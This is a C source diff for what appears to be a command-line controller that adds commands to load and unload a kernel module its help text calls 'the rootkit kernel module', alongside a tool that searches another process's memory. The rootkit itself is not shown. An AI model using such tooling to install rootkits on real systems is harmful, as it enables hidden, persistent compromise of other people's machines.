@@ -23,10 +23,6 @@
 
 #define CMD_BUFFER_SZ 64
 
-struct cmdObject co;
-
-static struct module_info mmsearch_module_info;
-
 void
 show_prompt(void)
 {
@@ -99,6 +95,10 @@ print_help(void)
 	       "\t\tdescr: loads the mmsearch kernel module\n\n"
 	       "\trkm-mmsearch\n"
 	       "\t\tdescr: unloads the mmsearch kernel module\n\n"
+	       "\tlkm-kernel-rk\n"
+	       "\t\tdescr: loads the rootkit kernel module\n\n"
+	       "\trkm-kernel-rk\n"
+	       "\t\tdescr: unloads the rootkit kernel module\n\n"	       
 	       "\tmmsearch-pid <proc_id>\n"
 	       "\t\tdescr: searches a given process' memory space\n"
 	       "\t\t       depends on mmsearch kernel module\n\n"
@@ -165,8 +165,8 @@ process_cli_cmd(char *input)
 
 		if (strcasecmp(ptr, "rkm-mmsearch") == 0) {
 			ret_val = unload_kernel_module("mmsearch");
-			if (ret_val == 0) {
-				memset(&mmsearch_module_info, 0, sizeof(struct module_info));
+			if (ret_val < 0) {
+				printf("failed to unload modul\n");
 			}
 			goto done;
 		}
@@ -180,16 +180,36 @@ process_cli_cmd(char *input)
 				printf("Failed to get module path\n");
 			} else {
 				ret_val = ld_kernel_module(module_to_load, &fd);
-				if (ret_val == 0) {
-					memcpy(&mmsearch_module_info.module_name,
-					       module_to_load,
-					       MAX_MODULE_NAME);
-					mmsearch_module_info.installed = 1;
-					mmsearch_module_info.module_fd = fd;
+				if (ret_val < 0) {
+					printf("Failed to load module\n");
 				}
 			}
 			goto done;
 		}
+
+		if (strcasecmp(ptr, "rkm-kernel-rk") == 0) {
+			ret_val = unload_kernel_module("kernel_rk");
+			if (ret_val < 0) {
+				printf("failed to unload modul\n");
+			}
+			goto done;
+		}
+
+		if (strcasecmp(ptr, "lkm-kernel-rk") == 0) {
+			char module_to_load[MAXPATHLEN] = {0};
+			ret_val = path_constructor(module_to_load,
+						   "kernel_rk.ko",
+						   KERNEL_RK_MODULE);
+			if (ret_val < 0) {
+				printf("Failed to get module path\n");
+			} else {
+				ret_val = ld_kernel_module(module_to_load, &fd);
+				if (ret_val < 0) {
+					printf("Failed to load module\n");
+				}
+			}
+			goto done;
+		}		
 
 		if (strcasecmp(ptr, "mmsearch-pid") == 0) {
 			if ((ret_val = mmsearch_pid(input) != 0))
